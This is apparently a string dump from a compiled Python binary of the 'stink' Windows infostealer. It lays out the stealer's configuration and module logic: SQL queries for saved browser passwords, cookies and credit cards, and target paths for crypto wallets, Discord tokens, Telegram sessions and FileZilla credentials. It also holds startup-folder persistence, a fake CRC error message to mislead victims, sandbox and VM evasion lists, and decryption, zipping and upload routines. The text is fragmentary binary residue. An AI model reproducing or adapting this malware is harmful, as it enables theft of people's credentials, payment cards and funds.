bytea__doc__a__file__a__spec__aoriginahas_locationa__cached__axrangeaappend_PKCS7_paddingastrip_PKCS7_paddingustink\helpers\cipher\utils.pyTa.0wbu<module stink.helpers.cipher.utils>TwcTadataapadTabinaryu.stink.helpers.configY"a__doc__a__file__a__spec__aoriginahas_locationa__cached__aenumTaEnumlaEnumaenvironagetpassTagetuseragetuserareTacompileaIGNORECASEaDOTALLacompileaIGNORECASEaDOTALLagetTaSystemRootuC:\Windowsasys_rootTaUSERPROFILEauser_profileauseruMozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11auser_agenta__prepare__aBrowsersa__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ustink.helpers.configa__module__a__qualname__aChromeaCHROMEuOpera GXaOPERA_GXuOpera DefaultaOPERA_DEFAULTuMicrosoft EdgeaEDGEaBraveaBRAVEaVivaldiaVIVALDIaYandexaYANDEXa__orig_bases__aChromiumConfigu"name":\s*"([^\'\"]*)"[\s\S]*"url":\s*"([^\'\"]*)"aBookmarksRegexuSELECT action_url, username_value, password_value FROM loginsaPasswordsSQLuSELECT host_key, name, encrypted_value FROM cookiesaCookiesSQLuSELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cardsaCardsSQLuSELECT url FROM visits ORDER BY visit_time DESC LIMIT 30000aHistorySQLuSELECT url, title, last_visit_time FROM urls WHERE id=%daHistoryLinksSQLuURL: {0}
+Username: {1}
+Password: {2}
+
+aPasswordsDatau{0}TRUE/FALSE2538097566{1}{2}aCookiesDatauUsername: {0}
+Number: {1}
+Expire Month: {2}
+Expire Year: {3}
+
+aCardsDatauURL: {0}
+Title: {1}
+Last Visit: {2}
+
+aHistoryDatauTitle: {0}
+Url: {1}
+
+aBookmarksDataLDanameafoldersaMetamaskLankbihfbeogaeaoehlefnkodbefgpgknnadjclckkglechooblngghdinmeemkbgciaejbalbakoplchlghecdalmeeeajnimhmDanameafoldersaPhantomLabfnaelmomeimhlpmgjnjophhpkkoljpaDanameafoldersaBinanceLafhbohimaelbohpjbbldcngcnapndodjpDanameafoldersaCoinbaseLahnfanknocfeofbddgcijnmhnfnkdnaadDanameafoldersaTrustLaegjidjbpglichdcondbcbdnbeeppgdphDanameafoldersaExodusLaaholpfdialjgjfhomihkjbmgjidlcdnoaWalletLogsTaMultistealerConfiglaPoolSizeuu-staZipNameapathu\AppData\Local\Google\Chrome\User Dataaprocessuchrome.exeu\AppData\Roaming\Opera Software\Opera GX Stableuopera.exeu\AppData\Roaming\Opera Software\Opera Stableu\AppData\Local\Microsoft\Edge\User Dataumsedge.exeu\AppData\Local\BraveSoftware\Brave-Browser\User Dataubrave.exeu\AppData\Local\Vivaldi\User Datauvivaldi.exeu\AppData\Local\Yandex\YandexBrowser\User Dataubrowser.exeaBrowsersDataaSystemConfigaUseruhttps://ipinfo.io/jsonaIPUrluUser: {0}
+IP: {1}
+Machine Type: {2}
+OS Name: {3}
+Machine Name on Network: {4}
+Monitor: {5}
+CPU: {6}
+GPU: {7}
+RAM:
+{8}
+Drives:
+{9}aSystemDataaSenderConfigaUserAgentaAutostartConfigaSystemaAutostartNameu\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartupaAutostartPathaDiscordConfigu\AppData\Roaming\Discord\Local Storage\leveldbaTokensPathuUsername: {0}
+Email: {1}
+Phone: {2}
+Bio: {3}
+Token: {4}
+
+aDiscordDataaTelegramConfigu\AppData\Roaming\Telegram DesktopaSessionsPathaFileZillaConfigu\AppData\Roaming\FileZillaaSitesPathTurecentservers.xmlusitemanager.xmlaDataFilesuName: {0}
+User: {1}
+Password: {2}
+Host: {3}
+Port: {4}
+
+aFileZillaDataaMessageConfigu0x17aMessageTitleuERROR_CRC: Data error (cyclic redundancy check).aMessageDescriptionaWalletsConfiganameaAtomicu\AppData\Roaming\atomic\Local Storage\leveldbaExodusu\AppData\Roaming\Exodus\exodus.walletaElectrumu\AppData\Roaming\Electrum\walletsaEthereumu\AppData\Roaming\Ethereum\keystoreaArmoryu\AppData\Roaming\ArmoryaBytecoinu\AppData\Roaming\bytecoinaGuardau\AppData\Roaming\Guarda\Local Storage\leveldbaCoinomiu\AppData\Local\Coinomi\Coinomi\walletsaZcashu\AppData\Local\ZcashaWalletPathsaProtectorConfigTu00:03:47:63:8b:deu00:0c:29:05:d8:6eu00:0c:29:2c:c1:21u00:0c:29:52:52:50u00:0d:3a:d2:4f:1fu00:15:5d:00:00:1du00:15:5d:00:00:a4u00:15:5d:00:00:b3u00:15:5d:00:00:c3u00:15:5d:00:00:f3u00:15:5d:00:01:81u00:15:5d:00:02:26u00:15:5d:00:05:8du00:15:5d:00:05:d5u00:15:5d:00:06:43u00:15:5d:00:07:34u00:15:5d:00:1a:b9u00:15:5d:00:1c:9au00:15:5d:13:66:cau00:15:5d:13:6d:0cu00:15:5d:1e:01:c8u00:15:5d:23:4c:a3u00:15:5d:23:4c:adu00:15:5d:b6:e0:ccu00:1b:21:13:15:20u00:1b:21:13:21:26u00:1b:21:13:26:44u00:1b:21:13:32:20u00:1b:21:13:32:51u00:1b:21:13:33:55u00:23:cd:ff:94:f0u00:25:90:36:65:0cu00:25:90:36:65:38u00:25:90:36:f0:3bu00:25:90:65:39:e4u00:50:56:97:a1:f8u00:50:56:97:ec:f2u00:50:56:97:f6:c8u00:50:56:a0:06:8du00:50:56:a0:38:06u00:50:56:a0:39:18u00:50:56:a0:45:03u00:50:56:a0:59:10u00:50:56:a0:61:aau00:50:56:a0:6d:86u00:50:56:a0:84:88u00:50:56:a0:af:75u00:50:56:a0:cd:a8u00:50:56:a0:d0:fau00:50:56:a0:d7:38u00:50:56:a0:dd:00u00:50:56:ae:5d:eau00:50:56:ae:6f:54u00:50:56:ae:b2:b0u00:50:56:ae:e5:d5u00:50:56:b3:05:b4u00:50:56:b3:09:9eu00:50:56:b3:14:59u00:50:56:b3:21:29u00:50:56:b3:38:68u00:50:56:b3:38:88u00:50:56:b3:3b:a6u00:50:56:b3:42:33u00:50:56:b3:4c:bfu00:50:56:b3:50:deu00:50:56:b3:91:c8u00:50:56:b3:94:cbu00:50:56:b3:9e:9eu00:50:56:b3:a9:36u00:50:56:b3:d0:a7u00:50:56:b3:dd:03u00:50:56:b3:ea:eeu00:50:56:b3:ee:e1u00:50:56:b3:f6:57u00:50:56:b3:fa:23u00:e0:4c:42:c7:cbu00:e0:4c:44:76:54u00:e0:4c:46:cf:01u00:e0:4c:4b:4a:40u00:e0:4c:56:42:97u00:e0:4c:7b:7b:86u00:e0:4c:94:1f:20u00:e0:4c:b3:5a:2au00:e0:4c:b8:7a:58u00:e0:4c:cb:62:08u00:e0:4c:d6:86:77u06:75:91:59:3e:02u08:00:27:3a:28:73u08:00:27:45:13:10u12:1b:9e:3c:a6:2cu12:8a:5c:2a:65:d1u12:f8:87:ab:13:ecu16:ef:22:04:af:76u1a:6c:62:60:3b:f4u1c:99:57:1c:ad:e4u1e:6c:34:93:68:64u2e:62:e8:47:14:49u2e:b8:24:4d:f7:deu32:11:4d:d0:4a:9eu3c:ec:ef:43:fe:deu3c:ec:ef:44:00:d0u3c:ec:ef:44:01:0cu3c:ec:ef:44:01:aau3e:1c:a1:40:b7:5fu3e:53:81:b7:01:13u3e:c1:fd:f1:bf:71u42:01:0a:8a:00:22u42:01:0a:8a:00:33u42:01:0a:8e:00:22u42:01:0a:96:00:22u42:01:0a:96:00:33u42:85:07:f4:83:d0u4e:79:c0:d9:af:c3u4e:81:81:8e:22:4eu52:54:00:3b:78:24u52:54:00:8b:a6:08u52:54:00:a0:41:92u52:54:00:ab:de:59u52:54:00:b3:e4:71u56:b0:6f:ca:0a:e7u56:e8:92:2e:76:0du5a:e2:a6:a4:44:dbu5e:86:e4:3d:0d:f6u60:02:92:3d:f1:69u60:02:92:66:10:79u7e:05:a3:62:9c:4du90:48:9a:9d:d5:24u92:4c:a8:23:fc:2eu94:de:80:de:1a:35u96:2b:e9:43:96:76ua6:24:aa:ae:e6:12uac:1f:6b:d0:48:feuac:1f:6b:d0:49:86uac:1f:6b:d0:4d:98uac:1f:6b:d0:4d:e4ub4:2e:99:c3:08:3cub4:a9:5a:b1:c6:fdub6:ed:9d:27:f4:faube:00:e5:c5:0c:e5uc2:ee:af:fd:29:21uc8:9f:1d:b6:58:e4uca:4d:4b:ca:18:ccud4:81:d7:87:05:abud4:81:d7:ed:25:54ud6:03:e4:ab:77:8euea:02:75:3c:90:9fuea:f6:f1:a2:33:76uf6:a5:41:31:b2:78aMacAddressesT/uBEE7370C-8C0C-4uDESKTOP-NAKFFMTuWIN-5E07COS9ALRuB30F0242-1C6A-4uDESKTOP-VRSQLAGaQ9IATRKPRHaXC64ZBuDESKTOP-D019GDMuDESKTOP-WI8CLETaSERVER1uLISA-PCuJOHN-PCuDESKTOP-B0T93D6uDESKTOP-1PYKP29uDESKTOP-1Y2433RaWILEYPCaWORKu6C4E733F-C2D9-4uRALPHS-PCuDESKTOP-WG3MYJSuDESKTOP-7XC6GEZuDESKTOP-5OV9S0OaQarZhrdBpjaORELEEPCaARCHIBALDPCuJULIA-PCad1bnJkfVlHaNETTYPCuDESKTOP-BUGIOuDESKTOP-CBGPFEEuSERVER-PCaTIQIYLA9TW5MuDESKTOP-KALVINOaCOMPNAME_4047uDESKTOP-19OLLTDuDESKTOP-DE369SEuEA8C2E2A-D017-4aAIDANPCuLUCAS-PCaACEPCuMIKE-PCuDESKTOP-IAPKN1PuDESKTOP-NTU7VUOuLOUISE-PCaT00917atest42uDESKTOP-CM0DAW8aComputersT1uBEE7370C-8C0C-4uDESKTOP-NAKFFMTuWIN-5E07COS9ALRuB30F0242-1C6A-4uDESKTOP-VRSQLAGaQ9IATRKPRHaXC64ZBuDESKTOP-D019GDMuDESKTOP-WI8CLETaSERVER1uDESKTOP-B0T93D6uDESKTOP-1PYKP29uDESKTOP-1Y2433RaWILEYPCaWORKu6C4E733F-C2D9-4uRALPHS-PCuDESKTOP-WG3MYJSuDESKTOP-7XC6GEZuDESKTOP-5OV9S0OaQarZhrdBpjaORELEEPCaARCHIBALDPCuJULIA-PCad1bnJkfVlHaWDAGUtilityAccountainkaRDhJ0CNFevzXakEecfMwgju8Nl0ColNQ5bqaPxmdUOpVyxu8VizSMaw0fjuOVmCcP5AalmVwjj9baPqONjHVwexsSu3u2v9m8aHEUeRzlaBvJChRPnsxnaSqgFOf3Gah7dk1xPraRGzcBUyrznRegaOgJb6GqgK0Ou4CrA8IZTwHZeaabhcolemu28DnZnMtF0wu4qZR8aa7mEbvN6aw5lwDo8hdU24aZGuuuZQWaUsersT8uProcessHacker.exeuhttpdebuggerui.exeuwireshark.exeufiddler.exeuregedit.exeucmd.exeutaskmgr.exeuvboxservice.exeudf5serv.exeuprocesshacker.exeuvboxtray.exeuvmtoolsd.exeuvmwaretray.exeuvmwareservice.exeuida64.exeuollydbg.exeupestudio.exeuvmwareuser.exeuvgauthservice.exeuvmacthlp.exeuvmsrvc.exeux32dbg.exeux64dbg.exeux96dbg.exeuvmusrvc.exeuprl_cc.exeuprl_tools.exeuqemu-ga.exeujoeboxcontrol.exeuksdumperclient.exeuxenservice.exeujoeboxserver.exeudevenv.exeuIMMUNITYDEBUGGER.EXEuImportREC.exeureshacker.exeuwindbg.exeu32dbg.exeu64dbg.exeuprotection_id.exeuscylla_x86.exeuscylla_x64.exeuscylla.exeuidau64.exeuidau.exeuidaq64.exeuidaq.exeuidaq.exeuidaw.exeuidag64.exeuidag.exeuida64.exeuida.exeuollydbg.exeufakenet.exeudumpcap.exeaTasksTavirtualboxavmwareaCardsTavmwareaqemuavirtioavboxaxenaVMWaVirtualaRegistryEnumsu\System32\vmGuestLib.dllu\vboxmrxnp.dllaDllsuhttp://ip-api.com/line/?fields=hostingustink\helpers\config.pyu<module stink.helpers.config>Ta__class__.stink.helpersB3a__doc__a__file__apathadirnameajoinaenvironagetTaNUITKA_PACKAGE_stinku\not_existingahelpersTaNUITKA_PACKAGE_stink_helpersu\not_existinga__path__a__spec__aoriginahas_locationasubmodule_search_locationsa__cached__uTaconfiglaconfiglTafunctionsafunctionsTadataclassesadataclassesamultipartTaMultipartFormDataEncoderaMultipartFormDataEncoderastructuresTaDataBlobaProcessEntry32aProcessMemoryCountersExaDisplayDeviceaMemoryStatusExaUlargeIntegeraBitmapInfoHeaderaBitmapInfoaDataBlobaProcessEntry32aProcessMemoryCountersExaDisplayDeviceaMemoryStatusExaUlargeIntegeraBitmapInfoHeaderaBitmapInfoascreenshotTaScreencaptureaScreencaptureacipherTaAESModeOfOperationGCMaAESModeOfOperationGCMastorageTaMemoryStorageaMemoryStorageLaMultipartFormDataEncoderaconfigafunctionsadataclassesaDataBlobaProcessEntry32aProcessMemoryCountersExaDisplayDeviceaMemoryStatusExaUlargeIntegeraBitmapInfoHeaderaBitmapInfoaScreencaptureaAESModeOfOperationGCMaMemoryStoragea__all__ustink\helpers\__init__.pyu<module stink.helpers>.stink.helpers.dataclasses@a__doc__a__file__a__spec__aoriginahas_locationa__cached__aListlaTupleaAnyadataclassesTadataclassadataclassustink.helpers.dataclassesa__module__aFielda__qualname__a__annotations__uanameavalueTaDataafilesafieldsustink\helpers\dataclasses.pyu<module stink.helpers.dataclasses>Ta__class__.stink.helpers.functionsX)u
+    Generates a table from the data.
+
+    Parameters:
+    - header [list]: List of header columns.
+    - rows [list]: List of rows.
+
+    Returns:
+    - str: A rendered table with data.
+    arowslamaxaheaderw+w-lw|w aljustahorizontal_borderacreate_tablewiu<genexpr>ucreate_table.<locals>.<genexpr>arunu
+    Starts the process.
+
+    Parameters:
+    - process [any]: Class object.
+    - arguments [tuple]: Tuple of arguments for process.
+
+    Returns:
+    - List: List of collected files.
+    a__doc__a__file__a__spec__aoriginahas_locationa__cached__aListaAnyaTupleustink.helpers.dataclassesTaDataaDataareturnTnaprocessaargumentsarun_processustink\helpers\functions.pyTa.0arowwiu<module stink.helpers.functions>Taheaderarowsanum_columnsacol_widthsahorizontal_borderaheader_rowarowTaprocessaargumentsu.stink.helpers.multipartXauuid4ahexa_MultipartFormDataEncoder__boundaryadecodeTuutf-8u
+        Decodes the string.
+
+        Parameters:
+        - string [str|bytes]: String or bytes to be decoded.
+
+        Returns:
+        - str: Decoding result.
+        u
+        Writes fields and files to the body.
+
+        Parameters:
+        - fields [list]: Fields for writing.
+        - files [list]: Files for writing.
+
+        Returns:
+        - str: Result of file processing.
+        agetencoderafieldsutoo many values to unpack (expected 2)aselfwuaencoderu--uu
+uContent-Disposition: form-data; name="u"
+
+afilesutoo many values to unpack (expected 3)u"; filename="u"
+uContent-Type: aguess_typeluapplication/octet-streamu
+
+aBytesIOagetvalueareadTu
+u--
+aiteruMultipartFormDataEncoder.iterabodyawriteumultipart/form-data; boundary=aprintu[Form]: u
+        Converts specified files and fields to multipart/form-data format.
+
+        Parameters:
+        - fields [list]: Fields for converting.
+        - files [list]: Files for converting.
+
+        Returns:
+        - tuple: Multipart/form-data file representation.
+        a__doc__a__file__a__spec__aoriginahas_locationa__cached__auuidTauuid4lahexversionacodecsTagetencoderamimetypesTaguess_typeaUnionaListaTupleaBinaryIOTOobjecta__prepare__aMultipartFormDataEncodera__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ustink.helpers.multiparta__module__u
+    Creates a multipart/form-data content type.
+    a__qualname__a__init__uMultipartFormDataEncoder.__init__aclassmethodastringastrabytesareturnuMultipartFormDataEncoder.uaintaencodeuMultipartFormDataEncoder.encodea__orig_bases__ustink\helpers\multipart.pyu<module stink.helpers.multipart>Ta__class__TaselfTaselfafieldsafilesabodyachunkachunk_lenweTaselfafieldsafilesaencoderakeyavalueafilenameafiledataabufferTaclsastring.stink.helpers.screenshota__doc__a__file__apathadirnameajoinaenvironagetTaNUITKA_PACKAGE_stinku\not_existinguhelpers\screenshotTaNUITKA_PACKAGE_stink_helpersu\not_existingascreenshotTaNUITKA_PACKAGE_stink_helpers_screenshotu\not_existinga__path__a__spec__aoriginahas_locationasubmodule_search_locationsa__cached__ascreencaptureTaScreencapturelaScreencapturela__all__ustink\helpers\screenshot\__init__.pyu<module stink.helpers.screenshot>u.stink.helpers.screenshot.screenUa_Screen__pixelsa_Screen__rgbarawaScreenaPositionaleftatopapositionaSizeawidthaheightasizeaversionlashapelatypestru|u1adatal:lnl:nnl:lnl:lnl:nnl:lnlapixelsaprintuPixel location (uu, u) is out of range.a__doc__a__file__a__spec__aoriginahas_locationa__cached__acollectionsTanamedtupleanamedtupleaAnyaDictaOptionalaTypeustink.helpers.screenshot.screena__module__a__qualname__TOstrOintaMonitorTaSizeuwidth, heightTaPositionuleft, topTnamonitora__init__uScreen.__init__areturna__array_interface__uScreen.__array_interface__aclsaScreenShotafrom_sizeuScreen.from_sizeargbuScreen.rgbabgrauScreen.bgrauScreen.heightuScreen.widthuScreen.leftuScreen.topuScreen.pixelsDwxwyOintpapixeluScreen.pixelTustink\helpers\screenshot\screen.pyu<module stink.helpers.screenshot.screen>Ta__class__TaselfTaselfadataamonitorasizeTaclsadataawidthaheightamonitorTaselfwxwyTaselfargbTaselfargbaraw.stink.helpers.screenshot.screencaptureaScreenacls_imagelacompression_levelawith_cursora_monitorsaWinDLLTauser32auser32Tagdi32agdi32a_set_cfunctionsa_set_dpi_awarenessDaheightawidthlpa_bboxacreate_string_bufferTla_dataa_get_srcdcaScreencaptureamemdcaCreateCompatibleDCaBitmapInfoasizeofaBitmapInfoHeaderabmiHeaderabiSizelabiPlanesl abiBitCountlabiCompressionabiClrUsedabiClrImportanta_bmialocka__enter__a__exit__a_monitors_implTnnnapositionasizeutoo many values to unpack (expected 2)arawlamax;lllacywwacxacwapos_sapos_cllascreen_dataargbacposaalphaasposaargtypesarestypeaerrchecka_cfactoryaCFUNCTIONSaitemsutoo many values to unpack (expected 3)acfactoryTaattrafuncaargtypesarestypeagetwindowsversion:nlnTllawindllashcoreaSetProcessDpiAwarenessTlTllaSetProcessDPIAwareacurrent_threada_srcdc_dictagetamain_threadaGetWindowDCasrcdcaGetSystemMetricsaappendaleftTlLatopTlMawidthTlNaheightTlOamonitoradataaHDCarectaLPRECTadc_aLPARAMareturna_callbackuScreencapture._monitors_impl.<locals>._callbackaMONITORNUMPROCaEnumDisplayMonitorsacontentsaselfaint_arightabottomabiWidthabiHeightabmpaDeleteObjectaCreateCompatibleBitmapaSelectObjectaBitBltaSRCCOPYaCAPTUREBLTaGetDIBitsaDIB_RGB_COLORSaprintTugdi32.GetDIBits() failed.la_grab_impla_cursor_impla_mergeamonitorsagrabacreate_pngTalevelaoutputasave_in_memoryuScreencapture.save_in_memoryu<genexpr>uScreencapture.save_in_memory.<locals>.<genexpr>apackTu>Blcapng_filteralineTu>8BllPlNlGl
+l
+ll
+LccIHDRcpu>2I5Blu>Iacrc32:llnqcIDATacompressLccIENDcpawbawriteaflushafsyncafilenoa__doc__a__file__a__spec__aoriginahas_locationa__cached__astructTapackazlibTacrc32acompressaPOINTERaWINFUNCTYPEac_void_paArrayac_charaBOOLaDOUBLEaDWORDaHBITMAPaHGDIOBJaHWNDaINTaRECTaUINTathreadingTaLockacurrent_threadamain_threadaLockaAnyaCallableaListaOptionalaTupleaUnionaDictustink.helpers.screenshot.screenTaScreenustink.helpersTaBitmapInfoHeaderaBitmapInfoq@l aGetDeviceCapsustink.helpers.screenshot.screencapturea__module__a__qualname__TOstrOintaMonitorw_a__init__uScreencapture.__init__uScreencapture.monitorsascreenshotacursoruScreencapture._mergeTnaattrafuncuScreencapture._cfactoryDareturnnuScreencapture._set_cfunctionsuScreencapture._set_dpi_awarenessDareturnOintuScreencapture._get_srcdcuScreencapture._monitors_impluScreencapture._grab_impluScreencapture._cursor_implTOintpppuScreencapture.grabakwargsacreate_in_memoryuScreencapture.create_in_memoryTlnTOintpalevelaoutputuScreencapture.create_pngTustink\helpers\screenshot\screencapture.pyTa.0amonitoru<module stink.helpers.screenshot.screencapture>Ta__class__Taselfw_asrcdcabmiTamonitoradataarectadc_arctaselfaint_Taint_aselfTaattrafuncaargtypesarestypeaerrcheckamethTaselfTaselfacurrent_thread_indexacurrent_srcdcasrcdcTaselfamonitorasrcdcamemdcawidthaheightabitsTascreenshotacursoracxacyacwachwxwywwwhacx2acy2ax2ay2aoverlapascreen_dataacursor_dataastart_count_yastart_count_xastop_count_yastop_count_xargbacount_yapos_sapos_cacount_xasposacposaalphaaitemTaselfaint_auser32aget_system_metricsa_callbackacallbackTaselfacfactoryaattrsafuncaattraargtypesarestypeTaselfaversionTaselfakwargsTadataasizealevelaoutputawidthaheightalineapng_filterascanlinesamagicaihdraidataiendafilehTaselfamonitorascreenshotacursorTaselfamonitorsaindexadisplayasctaoutputu.stink.helpers.storageaBytesIOa_MemoryStorage__buffera_MemoryStorage__filesa_MemoryStorage__countsaappendu
+        Adds a file to the list of files.
+
+        Parameters:
+        - source_path [str]: File name or path inside the archive.
+        - content [str|bytes]: File content.
+
+        Returns:
+        - None.
+        arbareadawalkutoo many values to unpack (expected 3)apathajoinafolder_namearelpathasource_pathazip_pathaselfaprintu[Storage]: Error while copying a file uu - Tu[Storage]: The file is unsupported.u
+        Adds a file path to the list of files.
+
+        Parameters:
+        - source_path [str]: File name or path to be copied.
+        - zip_path [str]: Path to the file or folder in the archive.
+
+        Returns:
+        - None.
+        aFieldDaUseraIPaOSaUnknownaUnknownaUnknownDaCookiesaPasswordsaHistoryaBookmarksaExtensionsaCardslpppppTLppanameavalueutoo many values to unpack (expected 2)acomputerakeysabrowsersaApplicationaapplicationsaWalletawalletsaGrabberagrabbersu, uNo applications founduNo wallets founduNo grabbed files foundadedentu
+        🖥️ User: aUseru
+        🌐 IP: aIPu
+        📋 OS Name: aOSu
+
+        🍪 Cookies: aCookiesu
+        🔒 Passwords: aPasswordsu
+        📖 History: aHistoryu
+        📚 Bookmarks: aBookmarksu
+        📦 Extensions: aExtensionsu
+        💳 Cards: aCardsu
+
+        📁 Other applications:
+        u
+
+        💸 Crypto wallets:
+        u
+
+        📝 Grabbed files:
+        u
+        u
+        Creates a preview of the collected data.
+
+        Parameters:
+        - fields [list]: List of fields with data.
+
+        Returns:
+        - None.
+        aDatau
+        Returns the contents of the archive.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        aZipFilewwaZIP_DEFLATEDTamodeacompressiona__enter__a__exit__azip_fileawritestrTnnnaseekTlu
+        Adds files from a list of data returned by get_data method of other MemoryStorage objects into one archive.
+
+        Parameters:
+        - files [list]: List of files for creating the archive.
+
+        Returns:
+        - BytesIO: BytesIO object.
+        a__doc__a__file__a__spec__aoriginahas_locationa__cached__latextwrapTadedentazipfileTaZipFileaZIP_DEFLATEDaUnionaListaTupleaAnyStraOptionalaAnyustink.helpers.dataclassesTaDataaFieldustink.helpers.storagea__module__u
+    Creates a storage in the memory.
+    aMemoryStoragea__qualname__a__init__uMemoryStorage.__init__acontentTOstrObytesareturnaadd_from_memoryuMemoryStorage.add_from_memoryTnaadd_from_diskuMemoryStorage.add_from_diskadataaadd_datauMemoryStorage.add_dataafieldsacreate_previewuMemoryStorage.create_previewaget_datauMemoryStorage.get_dataafilesacreate_zipuMemoryStorage.create_zipTustink\helpers\storage.pyu<module stink.helpers.storage>Ta__class__TaselfTaselfanameadataT
+aselfasource_pathazip_pathafolder_namew_afile_namesafile_nameafile_pathaname_in_zipweTaselfasource_pathacontentT
+afieldsacomputerabrowsersaapplicationsawalletsagrabbersafieldanameavalueapreviewTaselfafilesazip_fileafile_nameacontent.stink.helpers.structures/ba__doc__a__file__a__spec__aoriginahas_locationa__cached__aDWORDlaULONGaCHARaMAX_PATHaLONGaWORDaStructureaPOINTERac_charac_ulongac_size_tac_wcharac_uint32ac_ulonglonga__prepare__aDataBloba__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ustink.helpers.structuresa__module__a__qualname__acbDataapbDataa_fields_a__orig_bases__aProcessEntry32adwSizeacntUsageath32ProcessIDath32DefaultHeapIDath32ModuleIDacntThreadsath32ParentProcessIDapcPriClassBaseadwFlagsaszExeFileaProcessMemoryCountersExacbaPageFaultCountaPeakWorkingSetSizeaWorkingSetSizeaQuotaPeakPagedPoolUsageaQuotaPagedPoolUsageaQuotaPeakNonPagedPoolUsageaQuotaNonPagedPoolUsageaPagefileUsageaPeakPagefileUsageaPrivateUsageaDisplayDeviceaDeviceNamel aDeviceStringlaStateFlagsaDeviceIDaDeviceKeyaMemoryStatusExadwLengthadwMemoryLoadaullTotalPhysaullAvailPhysaullTotalPageFileaullAvailPageFileaullTotalVirtualaullAvailVirtualasullAvailExtendedVirtualaUlargeIntegeraLowPartaHighPartaBitmapInfoHeaderabiSizeabiWidthabiHeightabiPlanesabiBitCountabiCompressionabiSizeImageabiXPelsPerMeterabiYPelsPerMeterabiClrUsedabiClrImportantaBitmapInfoabmiHeaderabmiColorslustink\helpers\structures.pyu<module stink.helpers.structures>Ta__class__u.stink.modules.browsersj"/a_Chromium__browser_nameapathajoinuLocal Statea_Chromium__state_patha_Chromium__browser_patha_Chromium__process_namea_Chromium__statusesa_Chromium__profilesaMemoryStoragea_Chromium__storageaChromiumConfiga_Chromium__configaBrowsersa_Chromium__patharunutaskkill /f /im uaCREATE_NEW_CONSOLEaSW_HIDETashellacreationflagsu
+        Kills browser process.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        acompileTuDefault|Profile \d+apatternafindallaselfu
+        Collects all browser profiles.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - list: List of all browser profiles.
+        a_get_profilesu
+        Checks if a browser is installed and if data collection from it is enabled.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        aDataBlobawindllacrypt32aCryptUnprotectDataabyrefac_bufferlacbDataacdllamsvcrtamemcpyapbDataakernel32aLocalFreearawu
+        Decrypts data previously encrypted using Windows CryptProtectData function.
+
+        Parameters:
+        - encrypted_bytes [b64decode]: The encrypted data to be decrypted.
+        - entropy [bytes]: Optional entropy to provide additional security during decryption.
+
+        Returns:
+        - bytes: Decrypted data as bytes.
+        wruutf-8a__enter__a__exit__areadTnnnaclosea_crypt_unprotect_dataab64decodealoadsafileaos_cryptaencrypted_key:lnnu
+        Receives the decryption key.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - bytes: Decryption key.
+        adatetimeTlAlpatimedeltaTamicrosecondsuCan't decodeu
+        Converts timestamp to date.
+
+        Parameters:
+        - date [int]: Date to be converted.
+
+        Returns:
+        - str: Converted date or error message.
+        aAESModeOfOperationGCM:llnadecrypt:lnn:nlnadecodeu
+        Decrypts the value with the master key.
+
+        Parameters:
+        - value [bytes]: The value to be decrypted.
+        - master_key [bytes]: Decryption key.
+
+        Returns:
+        - str: Decrypted string.
+        aconnectufile:u?mode=ro&immutable=1Dauriaisolation_levelacheck_same_threadtnFacursoru
+        Creates a connection with the database.
+
+        Parameters:
+        - database [str]: Path to database.
+
+        Returns:
+        - tuple: Cursor and Connection objects.
+        adatau
+        Reads the file contents.
+
+        Parameters:
+        - file_path [str]: Path to file.
+
+        Returns:
+        - str: File content.
+        aprintw[u]: No passwords file founda_get_db_connectionutoo many values to unpack (expected 2)aexecuteaPasswordsSQLafetchallu]: No passwords foundaPasswordsDataaformatla_decryptla_Chromium__master_keyaadd_from_memoryu Passwords.txtaadd_dataaPasswordsu
+        Collects browser passwords.
+
+        Parameters:
+        - profile [str]: Browser profile.
+        - main_path [str]: Path of the file to be processed.
+        - alt_path [str]: Spare path of the file to be processed.
+
+        Returns:
+        - None.
+        u<genexpr>uChromium._grab_passwords.<locals>.<genexpr>u]: No cookies file foundaCookiesSQLu]: No cookies foundaCookiesDatau Cookies.txtw
+aCookiesu
+        Collects browser cookies.
+
+        Parameters:
+        - profile [str]: Browser profile.
+        - main_path [str]: Path of the file to be processed.
+        - alt_path [str]: Spare path of the file to be processed.
+
+        Returns:
+        - None.
+        uChromium._grab_cookies.<locals>.<genexpr>u]: No cards file foundaCardsSQLu]: No cards foundaCardsDatalu Cards.txtaCardsu
+        Collects browser cards.
+
+        Parameters:
+        - profile [str]: Browser profile.
+        - main_path [str]: Path of the file to be processed.
+        - alt_path [str]: Spare path of the file to be processed.
+
+        Returns:
+        - None.
+        uChromium._grab_cards.<locals>.<genexpr>u]: No history file foundaHistorySQLaHistoryLinksSQLafetchoneu]: No history foundaHistoryDataa_get_datetimeu History.txtaHistoryu
+        Collects browser history.
+
+        Parameters:
+        - profile [str]: Browser profile.
+        - main_path [str]: Path of the file to be processed.
+        - alt_path [str]: Spare path of the file to be processed.
+
+        Returns:
+        - None.
+        uChromium._grab_history.<locals>.<genexpr>u]: No bookmarks file founda_get_fileasplitTw{aBookmarksRegexu]: No bookmarks foundaBookmarksDatau Bookmarks.txtaBookmarksu
+        Collects browser bookmarks.
+
+        Parameters:
+        - profile [str]: Browser profile.
+        - main_path [str]: Path of the file to be processed.
+        - alt_path [str]: Spare path of the file to be processed.
+
+        Returns:
+        - None.
+        uChromium._grab_bookmarks.<locals>.<genexpr>u]: No extensions folder foundu]: No extensions foundalistdiraextensions_pathlumanifest.jsonaloadagetTanameaextensions_listaappendu Extensions.txtaExtensionsu
+        Collects browser extensions.
+
+        Parameters:
+        - profile [str]: Browser profile.
+        - extensions_path [str]: Path to extensions directory.
+
+        Returns:
+        - None.
+        uChromium._grab_extensions.<locals>.<genexpr>u]: No wallets foundaWalletLogsafoldersawalletsaexistsaadd_from_diskaWalletsw anameaWalletu]: u
+        Collects browser wallets.
+
+        Parameters:
+        - profile [str]: Browser profile.
+        - wallets [str]: Path to wallets directory.
+
+        Returns:
+        - None.
